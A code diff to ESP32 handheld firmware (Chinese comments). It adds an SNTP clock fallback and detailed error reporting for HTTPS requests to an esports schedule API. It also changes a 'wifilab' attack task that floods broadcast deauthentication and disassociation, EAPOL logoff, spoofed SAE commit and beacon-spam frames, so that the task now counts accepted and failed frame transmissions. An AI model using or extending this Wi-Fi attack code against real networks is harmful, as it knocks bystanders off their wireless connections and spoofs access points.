@@ -113,6 +113,10 @@ static char s_channel_error[64];
 static app_channel_report_t s_channel_report;
 static bool s_channel_valid;
 
+// HTTPS 前的系统时钟兜底：见 ensure_system_clock()。
+static portMUX_TYPE s_clock_mux = portMUX_INITIALIZER_UNLOCKED;
+static bool s_clock_sync_tried;
+
 // 配网
 static httpd_handle_t s_httpd;
 static bool s_prov_active;
@@ -128,7 +132,10 @@ static int s_wifilab_channel;               // 目标信道
 static uint32_t s_wifilab_seed;
 static char s_wifilab_ssid[33];             // 目标 SSID（BEACON_AP_LIST / 展示用）
 static size_t s_wifilab_ssid_len;
-static volatile uint32_t s_wifilab_sent;    // 累计发射帧数（攻击任务自增）
+static volatile uint32_t s_wifilab_sent;    // 驱动接受（ESP_OK）的帧数（攻击任务自增）
+static volatile uint32_t s_wifilab_failed;  // 驱动拒绝的帧数（攻击任务自增）
+static esp_err_t s_wifilab_tx_err;          // 首个发射错误码；ESP_OK 表示尚未出错
+static char s_wifilab_tx_reason[40];        // 首个发射错误的一句话，供界面显示
 static bool s_wifilab_was_started;          // 射频是不是本角色借来的（决定停止时是否释放）
 static TaskHandle_t s_wifilab_task;         // 攻击任务句柄
 static esp_err_t s_wifilab_err;             // 最近一次开启结果
@@ -508,11 +515,65 @@ esp_err_t app_net_sync_time(void)
 // HTTP 客户端辅助
 // ---------------------------------------------------------------------------
 
+// 系统时钟是否可用于证书校验：设备没有 RTC，重启后 time(NULL) 从 1970 起算，
+// 这里用 2020-01-01 作为"显然未校准"的下界。
+#define NET_CLOCK_MIN_VALID 1577836800
+static bool net_clock_is_set(void)
+{
+    return time(NULL) >= (time_t)NET_CLOCK_MIN_VALID;
+}
+
+// HTTPS 的前置条件：mbedTLS 用系统时钟校验服务器证书的有效期。本轮开机若还没有任何一次
+// 成功的校准（自动校时被拦、超时，或用户还没校过时），系统时钟仍是 1970，所有 HTTPS 都会
+// 以"证书尚未生效"失败——界面却只显示一句"请求失败"。这里在请求前兜底做一次 SNTP；失败
+// 不阻断请求，但错误文案会写明"系统时间未校准"。每次开机自动兜底只做一次，避免每次请求
+// 都白等最多 8 秒。
+static void ensure_system_clock(void)
+{
+    if (net_clock_is_set()) return;
+
+    portENTER_CRITICAL(&s_clock_mux);
+    bool do_sync = !s_clock_sync_tried;
+    s_clock_sync_tried = true;
+    portEXIT_CRITICAL(&s_clock_mux);
+
+    if (!do_sync) return;
+
+    esp_err_t err = app_net_sync_time();
+    if (err == ESP_OK) {
+        ESP_LOGI(TAG, "HTTPS 前系统时钟未设置，SNTP 已校准");
+        return;
+    }
+
+    ESP_LOGW(TAG, "HTTPS 前系统时钟未设置，SNTP 校准失败: %s", esp_err_to_name(err));
+    if (err == ESP_ERR_INVALID_STATE) {
+        // 当前没联网（例如离线时打开了积分榜）。这次不算"已经试过"：等联网后的请求
+        // 再补一次，否则这一轮开机的 HTTPS 会一直卡在时间未校准上。
+        portENTER_CRITICAL(&s_clock_mux);
+        s_clock_sync_tried = false;
+        portEXIT_CRITICAL(&s_clock_mux);
+    }
+}
+
+// 把一句给人看的失败原因写进调用方的缓冲（写不下就截断）。
+static void http_set_error(char *errbuf, size_t errcap, const char *text)
+{
+    if (errbuf && errcap) copy_trunc(errbuf, errcap, text);
+}
+
 // 发 GET 请求并读取响应体。成功时 *out 为 malloc 出来的 NUL 结尾缓冲，调用方负责 free。
-static esp_err_t http_get_json(const char *url, char **out, int *out_len)
+// 失败时把具体原因写进 errbuf（可为 NULL）：以前所有失败都只有调用方那句笼统的
+// "请求失败"，连接失败、证书/时间问题、服务非 2xx、响应过大、内存不足全部长一个样，
+// 在拿不到日志的设备上无法定位。
+static esp_err_t http_get_json(const char *url, char **out, int *out_len,
+                               char *errbuf, size_t errcap)
 {
     if (out) *out = NULL;
     if (out_len) *out_len = 0;
+    if (errbuf && errcap) errbuf[0] = '\0';
+
+    // 先保证系统时钟可用：HTTPS 的证书校验依赖它。
+    ensure_system_clock();
 
     esp_http_client_config_t cfg = {
         .url = url,
@@ -523,13 +584,23 @@ static esp_err_t http_get_json(const char *url, char **out, int *out_len)
         .crt_bundle_attach = esp_crt_bundle_attach,
     };
     esp_http_client_handle_t client = esp_http_client_init(&cfg);
-    if (!client) return ESP_ERR_NO_MEM;
+    if (!client) {
+        ESP_LOGE(TAG, "GET %s 失败: 客户端初始化内存不足", url);
+        http_set_error(errbuf, errcap, "内存不足");
+        return ESP_ERR_NO_MEM;
+    }
 
     esp_http_client_set_header(client, "x-api-key", LOLESPORTS_KEY);
     esp_http_client_set_header(client, "Accept", "application/json");
 
     esp_err_t err = esp_http_client_open(client, 0);
     if (err != ESP_OK) {
+        // 打开阶段包含 DNS、TCP 与 TLS 握手。时钟没校准时的 TLS 失败要单独说清楚，
+        // 否则用户只会看到一个没法排查的"请求失败"。
+        ESP_LOGE(TAG, "GET %s 打开失败: %s（系统时钟%s）", url, esp_err_to_name(err),
+                 net_clock_is_set() ? "已校准" : "未校准");
+        http_set_error(errbuf, errcap,
+                       net_clock_is_set() ? "网络连接失败" : "系统时间未校准");
         esp_http_client_cleanup(client);
         return err;
     }
@@ -537,6 +608,10 @@ static esp_err_t http_get_json(const char *url, char **out, int *out_len)
     esp_http_client_fetch_headers(client);
     int status = esp_http_client_get_status_code(client);
     if (status < 200 || status >= 300) {
+        ESP_LOGE(TAG, "GET %s 返回 HTTP %d", url, status);
+        char msg[32];
+        snprintf(msg, sizeof(msg), "服务返回 %d", status);
+        http_set_error(errbuf, errcap, msg);
         esp_http_client_close(client);
         esp_http_client_cleanup(client);
         return ESP_ERR_INVALID_RESPONSE;
@@ -548,6 +623,8 @@ static esp_err_t http_get_json(const char *url, char **out, int *out_len)
     // 从 4 KB 起按倍翻倍，峰值只到实际正文大小——正常响应通常几 KB 到十几 KB。
     int hint = esp_http_client_get_content_length(client);
     if (hint > NET_HTTP_MAX_BODY) {
+        ESP_LOGE(TAG, "GET %s 响应 %d 字节超过上限 %d", url, hint, NET_HTTP_MAX_BODY);
+        http_set_error(errbuf, errcap, "响应过大");
         esp_http_client_close(client);
         esp_http_client_cleanup(client);
         return ESP_ERR_INVALID_SIZE;
@@ -555,6 +632,9 @@ static esp_err_t http_get_json(const char *url, char **out, int *out_len)
     int cap = (hint > 0) ? hint : 4096;
     char *buf = (char *)malloc((size_t)cap + 1);
     if (!buf) {
+        ESP_LOGE(TAG, "GET %s 分配 %d 字节失败（最大连续块 %u）", url, cap,
+                 (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
+        http_set_error(errbuf, errcap, "内存不足");
         esp_http_client_close(client);
         esp_http_client_cleanup(client);
         return ESP_ERR_NO_MEM;
@@ -581,8 +661,18 @@ static esp_err_t http_get_json(const char *url, char **out, int *out_len)
     esp_http_client_close(client);
     esp_http_client_cleanup(client);
 
-    if (err != ESP_OK) { free(buf); return err; }
-    if (too_big) { free(buf); return ESP_ERR_INVALID_SIZE; }
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "GET %s 读取失败: %s（已读 %d 字节）", url, esp_err_to_name(err), total);
+        http_set_error(errbuf, errcap, "数据接收中断");
+        free(buf);
+        return err;
+    }
+    if (too_big) {
+        ESP_LOGE(TAG, "GET %s 响应超过上限 %d 字节", url, NET_HTTP_MAX_BODY);
+        http_set_error(errbuf, errcap, "响应过大");
+        free(buf);
+        return ESP_ERR_INVALID_SIZE;
+    }
 
     buf[total] = '\0';
     if (out) *out = buf;
@@ -918,8 +1008,8 @@ static void esports_worker(void *arg)
         snprintf(url, sizeof(url), LOLESPORTS_BASE "getSchedule?hl=zh-CN");
 
         char *body = NULL;
-        if (http_get_json(url, &body, NULL) != ESP_OK) {
-            copy_trunc(err, sizeof(err), "赛程请求失败");
+        if (http_get_json(url, &body, NULL, err, sizeof(err)) != ESP_OK) {
+            if (!err[0]) copy_trunc(err, sizeof(err), "赛程请求失败");
             goto done;
         }
 
@@ -991,7 +1081,7 @@ static void esports_worker(void *arg)
         // ---- getLive：用实时状态与比分覆盖已有比赛 ----
         snprintf(url, sizeof(url), LOLESPORTS_BASE "getLive?hl=zh-CN");
         body = NULL;
-        if (http_get_json(url, &body, NULL) == ESP_OK) {
+        if (http_get_json(url, &body, NULL, NULL, 0) == ESP_OK) {
             cJSON *live_root = cJSON_Parse(body);
             free(body);
             if (live_root) {
@@ -1232,8 +1322,8 @@ static void esports_detail_worker(void *arg)
                  det->match_id);
 
         char *body = NULL;
-        if (http_get_json(url, &body, NULL) != ESP_OK) {
-            copy_trunc(err, sizeof(err), "详情请求失败");
+        if (http_get_json(url, &body, NULL, err, sizeof(err)) != ESP_OK) {
+            if (!err[0]) copy_trunc(err, sizeof(err), "详情请求失败");
             goto done;
         }
         cJSON *root = cJSON_Parse(body);
@@ -1295,7 +1385,7 @@ static void esports_detail_worker(void *arg)
         // ---- window feed：阵容 + 经济 + 选手 ----
         snprintf(url, sizeof(url), LOLESPORTS_FEED "%s", game_id);
         body = NULL;
-        if (http_get_json(url, &body, NULL) == ESP_OK) {
+        if (http_get_json(url, &body, NULL, NULL, 0) == ESP_OK) {
             cJSON *wroot = cJSON_Parse(body);
             free(body);
             if (wroot) {
@@ -1417,7 +1507,7 @@ static void leagues_worker(void *arg)
     snprintf(url, sizeof(url), LOLESPORTS_BASE "getLeagues?hl=zh-CN");
 
     char *body = NULL;
-    if (http_get_json(url, &body, NULL) == ESP_OK) {
+    if (http_get_json(url, &body, NULL, NULL, 0) == ESP_OK) {
         cJSON *root = cJSON_Parse(body);
         free(body);
         if (root) {
@@ -1539,7 +1629,7 @@ static void standings_worker(void *arg)
                  LOLESPORTS_BASE "getTournamentsForLeague?hl=zh-CN&leagueId=%s", slug);
 
         char *body = NULL;
-        if (http_get_json(url, &body, NULL) != ESP_OK) goto done;
+        if (http_get_json(url, &body, NULL, NULL, 0) != ESP_OK) goto done;
 
         cJSON *root = cJSON_Parse(body);
         free(body);
@@ -1575,7 +1665,7 @@ static void standings_worker(void *arg)
                  LOLESPORTS_BASE "getStandings?hl=zh-CN&tournamentId=%s", tournament_id);
 
         char *body = NULL;
-        if (http_get_json(url, &body, NULL) != ESP_OK) goto done;
+        if (http_get_json(url, &body, NULL, NULL, 0) != ESP_OK) goto done;
 
         cJSON *root = cJSON_Parse(body);
         free(body);
@@ -2826,7 +2916,7 @@ esp_err_t app_net_prov_start(void)
     log_prov_heap("AP 配置后");
 
     httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
-    hc.max_uri_handlers = 16;
+    hc.max_uri_handlers = 18;
     hc.lru_purge_enable = true;
     hc.stack_size = 6144;
     // 默认 7 个并发 socket，每个都要 lwIP 收发缓冲，在无 PSRAM 的板子上是配网启动
@@ -2957,6 +3047,26 @@ static void set_wifilab_reason(const char *text)
     if (text) snprintf(s_wifilab_reason, sizeof(s_wifilab_reason), "%s", text);
 }
 
+// 统计一次发射结果。只有 esp_wifi_80211_tx 返回 ESP_OK 才算"驱动已接受这一帧"：
+// 之前这里不看返回值、无条件累加，界面上的帧数只等于循环次数，会让人误以为帧已经上了
+// 空口。失败要计数，并把首个错误码留给界面——设备上拿不到日志时，这是唯一的排查入口。
+static void wifilab_count_tx(esp_err_t err)
+{
+    if (err == ESP_OK) {
+        s_wifilab_sent++;
+        return;
+    }
+
+    s_wifilab_failed++;
+    if (s_wifilab_tx_err == ESP_OK) {
+        // 先写好给人看的字符串，再落错误码：界面线程只读字符串，不会看到"半截"状态。
+        snprintf(s_wifilab_tx_reason, sizeof(s_wifilab_tx_reason), "%s",
+                 esp_err_to_name(err));
+        s_wifilab_tx_err = err;
+        ESP_LOGE(TAG, "Wi-Fi 实验发射被拒: %s", esp_err_to_name(err));
+    }
+}
+
 // 攻击循环：根据当前模式把构造好的帧逐包发射，直到 s_wifilab_active 被清。
 static void wifilab_attack_task(void *arg)
 {
@@ -2975,10 +3085,9 @@ static void wifilab_attack_task(void *arg)
             }
             // 广播去认证 / 去关联（AP -> 站点方向，目的=广播），与 GhostESP 的默认行为一致。
             app_wifilab_build_deauth(deauth, sizeof(deauth), s_wifilab_bssid, broadcast, 7, &len);
-            esp_wifi_80211_tx(WIFI_IF_AP, deauth, (int)len, false);
+            wifilab_count_tx(esp_wifi_80211_tx(WIFI_IF_AP, deauth, (int)len, false));
             app_wifilab_build_disassoc(disassoc, sizeof(disassoc), s_wifilab_bssid, broadcast, 7, &len);
-            esp_wifi_80211_tx(WIFI_IF_AP, disassoc, (int)len, false);
-            s_wifilab_sent += 2;
+            wifilab_count_tx(esp_wifi_80211_tx(WIFI_IF_AP, disassoc, (int)len, false));
             vTaskDelay(pdMS_TO_TICKS(5));
         }
         break;
@@ -2993,8 +3102,7 @@ static void wifilab_attack_task(void *arg)
                 esp_wifi_set_channel((uint8_t)s_wifilab_channel, WIFI_SECOND_CHAN_NONE);
             }
             app_wifilab_build_eapol_logoff(frame, sizeof(frame), s_wifilab_bssid, fake_sta, &len);
-            esp_wifi_80211_tx(WIFI_IF_AP, frame, (int)len, false);
-            s_wifilab_sent++;
+            wifilab_count_tx(esp_wifi_80211_tx(WIFI_IF_AP, frame, (int)len, false));
             vTaskDelay(pdMS_TO_TICKS(10));   // eapol_attack_delay_ms 默认 10
         }
         break;
@@ -3013,8 +3121,7 @@ static void wifilab_attack_task(void *arg)
             spoof[4] = (uint8_t)((fc >> 8) & 0xFF);
             spoof[5] = (uint8_t)(fc & 0xFF);
             app_wifilab_build_sae_commit(frame, sizeof(frame), s_wifilab_bssid, spoof, fc, &len);
-            esp_wifi_80211_tx(WIFI_IF_STA, frame, (int)len, false);
-            s_wifilab_sent++;
+            wifilab_count_tx(esp_wifi_80211_tx(WIFI_IF_STA, frame, (int)len, false));
             fc = (uint16_t)((fc + 1) % 65536);
             vTaskDelay(pdMS_TO_TICKS(10));   // 约 100 帧/秒
         }
@@ -3037,8 +3144,7 @@ static void wifilab_attack_task(void *arg)
                         while ((size_t)sl < sizeof(ap->ssid) && ap->ssid[sl] != '\0') sl++;
                         app_wifilab_build_beacon(frame, sizeof(frame), APP_WIFILAB_BEACON_AP_LIST,
                                                  ap->ssid, (size_t)sl, ap->bssid, ch, &len);
-                        esp_wifi_80211_tx(WIFI_IF_AP, frame, (int)len, false);
-                        s_wifilab_sent++;
+                        wifilab_count_tx(esp_wifi_80211_tx(WIFI_IF_AP, frame, (int)len, false));
                         vTaskDelay(pdMS_TO_TICKS(10));
                         if (!s_wifilab_active) break;
                     }
@@ -3056,8 +3162,7 @@ static void wifilab_attack_task(void *arg)
                         app_wifilab_build_beacon(frame, sizeof(frame), APP_WIFILAB_BEACON_RANDOM,
                                                  NULL, 0, NULL, ch, &len);
                     }
-                    esp_wifi_80211_tx(WIFI_IF_AP, frame, (int)len, false);
-                    s_wifilab_sent++;
+                    wifilab_count_tx(esp_wifi_80211_tx(WIFI_IF_AP, frame, (int)len, false));
                     vTaskDelay(pdMS_TO_TICKS(10));
                     if (!s_wifilab_active) break;
                 }
@@ -3124,6 +3229,9 @@ static esp_err_t wifilab_start_locked(void)
 
     s_wifilab_active = true;
     s_wifilab_sent = 0;
+    s_wifilab_failed = 0;
+    s_wifilab_tx_err = ESP_OK;
+    s_wifilab_tx_reason[0] = '\0';
     s_wifilab_running = true;
     s_wifilab_was_started = was_started;
     s_wifilab_err = ESP_OK;
@@ -3271,6 +3379,16 @@ app_wifilab_mode_t app_net_wifilab_mode(void)
 uint32_t app_net_wifilab_packets_sent(void)
 {
     return s_wifilab_sent;
+}
+
+uint32_t app_net_wifilab_packets_failed(void)
+{
+    return s_wifilab_failed;
+}
+
+const char *app_net_wifilab_tx_error_text(void)
+{
+    return s_wifilab_tx_reason[0] ? s_wifilab_tx_reason : NULL;
 }
 
 // ---------------------------------------------------------------------------
